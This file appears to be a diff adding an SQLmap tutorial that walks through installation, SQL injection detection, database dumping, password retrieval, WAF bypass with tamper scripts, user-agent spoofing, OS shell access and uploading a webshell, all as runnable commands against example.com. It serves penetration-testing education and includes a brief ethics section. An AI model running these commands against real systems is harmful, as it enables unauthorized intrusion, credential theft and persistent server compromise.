@@ -1,0 +1,190 @@
+
+Author: g3n3ric
+
+Extensive SQLmap Tutorial
+
+---
+
+Introduction to SQLmap
+
+SQLmap is a powerful, open-source penetration testing tool designed for automating the detection and exploitation of SQL injection vulnerabilities. It streamlines the identification of injection points, exploits them effectively, and helps security testers gain insights into vulnerable database systems.
+
+This guide covers comprehensive installation, detailed SQL injection techniques, advanced payload crafting, database extraction methods, and ethical considerations.
+
+---
+
+1. Detailed Installation and Setup
+
+Linux (Debian-based):
+```
+sudo apt update
+sudo apt install sqlmap
+```
+
+Linux (RedHat-based):
+```
+sudo yum install sqlmap
+```
+
+macOS:
+```
+brew install sqlmap
+```
+
+Windows:
+- Download from official GitHub: https://github.com/sqlmapproject/sqlmap
+- Run via Python:
+```
+python sqlmap.py -h
+```
+
+Verify installation:
+```
+sqlmap --version
+```
+
+---
+
+2. Detecting and Exploiting SQL Injection Vulnerabilities
+
+Basic Usage:
+```
+sqlmap -u "http://example.com/index.php?id=1"
+```
+
+Automatic Detection:
+```
+sqlmap -u "http://example.com?id=1" --batch
+```
+
+Advanced Testing:
+- Test all parameters:
+```
+sqlmap -u "http://example.com" --forms --crawl=2
+```
+
+- Specifying databases:
+```
+sqlmap -u "http://example.com?id=1" --dbs
+```
+
+---
+
+3. Comprehensive Payload Crafting and Advanced Techniques
+
+Payload Optimization:
+- Aggressive mode:
+```
+sqlmap -u "http://example.com?id=1" --level=5 --risk=3
+```
+
+- Using custom payloads:
+```
+sqlmap -u "http://example.com?id=1" --prefix="' OR 1=1 -- " --suffix="#"
+```
+
+Tampering Techniques:
+- Bypass WAF with tamper scripts:
+```
+sqlmap -u "http://example.com?id=1" --tamper=space2comment,charencode
+```
+
+---
+
+4. Database Extraction Methods
+
+MySQL:
+- Enumerating databases:
+```
+sqlmap -u "http://example.com?id=1" --dbs
+```
+- Extracting data:
+```
+sqlmap -u "http://example.com?id=1" -D database_name -T table_name --dump
+```
+
+MSSQL:
+- Retrieve user credentials:
+```
+sqlmap -u "http://example.com?id=1" --users --passwords
+```
+
+Oracle:
+- Extract schema information:
+```
+sqlmap -u "http://example.com?id=1" --schema
+```
+
+PostgreSQL:
+- Database enumeration:
+```
+sqlmap -u "http://example.com?id=1" --dbs
+```
+
+---
+
+5. Advanced Usage Scenarios
+
+Shell Access:
+- Command execution:
+```
+sqlmap -u "http://example.com?id=1" --os-shell
+```
+
+Operating System Command Execution:
+- Direct command execution:
+```
+sqlmap -u "http://example.com?id=1" --os-cmd "id"
+```
+
+File Upload and Download:
+- Upload webshell:
+```
+sqlmap -u "http://example.com?id=1" --file-write shell.php --file-dest /var/www/html/shell.php
+```
+
+---
+
+6. Troubleshooting Common Issues
+
+Blocked Requests:
+- Bypass by altering headers:
+```
+sqlmap -u "http://example.com?id=1" --user-agent="Googlebot/2.1"
+```
+
+Slow Extraction:
+- Optimize performance:
+```
+sqlmap -u "http://example.com?id=1" --threads=10 --batch
+```
+
+False Positives:
+- Double-check with manual verification and `--flush-session` to retest:
+```
+sqlmap -u "http://example.com?id=1" --flush-session
+```
+
+---
+
+7. Ethical Hacking Practices and Considerations
+
+- Obtain explicit written permission before testing.
+- Clearly define testing scope and limits.
+- Avoid damaging or altering sensitive data.
+- Responsibly disclose all findings.
+
+---
+
+8. Extensive References for Further Learning
+
+- Official SQLmap Wiki: https://github.com/sqlmapproject/sqlmap/wiki
+- OWASP SQL Injection Prevention: https://owasp.org/www-project-top-ten/
+- SQL injection payloads repository: https://github.com/payloadbox/sql-injection-payload-list
+- Security community forums: https://security.stackexchange.com/
+
+---
+
+Conclusion
+
+SQLmap is indispensable for effective and efficient testing of SQL injection vulnerabilities. Continuous learning, responsible use, and adherence to ethical standards will significantly enhance your penetration testing capabilities.
